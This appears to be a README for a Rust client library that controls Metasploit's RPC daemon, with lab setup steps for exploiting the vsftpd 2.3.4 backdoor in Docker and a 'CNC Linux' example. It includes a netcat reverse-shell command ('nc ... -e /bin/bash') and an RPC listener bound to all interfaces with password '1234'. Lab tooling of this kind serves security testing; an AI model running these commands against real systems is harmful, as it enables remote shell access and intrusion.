## MSF Client

A library which talks to msfrpcd process through msgpack. Some examples are provided.

#### Examples

##### VSFTPD Backdoor

To run vsftpd example, you can get the metasploit repo from github:

git clone https://github.com/rapid7/metasploit-framework

Also pull in the vsftpd image:

docker pull penkit/vsftpd

The vsftpd image is at version 2.3.4 which has the smiley backdoor.

The metasploit repo has a docker-compose file which you can use to run metasploit. Please refer to https://github.com/rapid7/metasploit-framework/tree/master/docker which has info on how to run the images. Once the ms container has started, type in

load msgrpc ServerHost=0.0.0.0 ServerPort=55553 User=msf Pass='1234'

in msf in order to start the RPC. 

For vsftpd, you can either integrate it into docker-compose or start it up separately.

sudo docker run --rm -it -p 21:21 penkit/vsftpd:2.3.4 /bin/bash

For metasploit, port 55553 is RPC port which we need to be able to access externally, so you need to have it open. For vsftpd, port 21 is ftp port that metasploit uses to exploit.

On the vsftpd docker image, start up vsftpd:

vsftpd /etc/vsftpd/vsftpd.conf

Now you should be able to put in the IP address of the metasploit docker instance (127.0.0.1:55553) in the example and run it.

##### CNC Linux

Here we are going to start up Metasploit in Listener mode, then we will manually connect to it from the vsftp docker image. You can use any other linux container, as long as it has ability to connect and pass stdin/stdout to shell.

Start up the ms container and vsftpd container like in last example.

Now run the cnc_linux.rs example. You shouldn't need to modify the localhost ip. 

The example program starts a thread that has the sole purpose of listening for incoming connections and telling the main thread what the session id is. That is necessary, since once we start the CNC, we need to manually connect to it from the client. The main thread sets everything up and blocks waiting for session ids. At this point you will need to login to the linux client container:

sudo docker exec -ti <client_container> /bin/bash

Execute the command:

nc <cnc_ip> <cnc_port> -e /bin/bash

The port is usually 4444. When the client connects you should get a normal bash session. From there, the main thread will attempt to upgrade to metepreter session. On successfull upgrade, it will run some commands and exit. At this point you should have two sessions that you can interact with.

The example was taken from:

https://www.hackingtutorials.org/networking/upgrading-netcat-shells-to-meterpreter/
